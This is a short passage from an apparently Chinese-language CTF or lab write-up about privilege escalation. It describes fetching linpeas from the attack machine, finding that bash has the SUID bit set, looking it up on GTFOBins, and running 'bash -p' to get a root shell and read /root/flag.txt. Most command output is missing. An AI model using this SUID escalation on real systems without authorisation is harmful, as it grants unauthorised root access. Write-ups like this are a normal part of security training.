## 提权

### 从攻击机下载linpeas查看信息

```


╔══════════╣ Executing Linux Exploit Suggester
```

  

发现bash具有suid权限, 在GTFOBins查看如何利用

![](../Images/e04ded4a36cd22b0eb04f284f69de7a5.png)

![](../Images/a992f0ce6a9623a2a64609b9f918a05d.png)

```


-bash-5.0$ id
```

在没有使用bash -p之前, 我们的权限是这样的

```

-bash-5.0$ bash -p# id


```

在使用了bash -p之后, 就提权上来了

```

-bash-5.0$ bash -p# id

# whoami

# ip a

# cd 
# ls

# cd /root
# ls

# cat flag.txt 


```
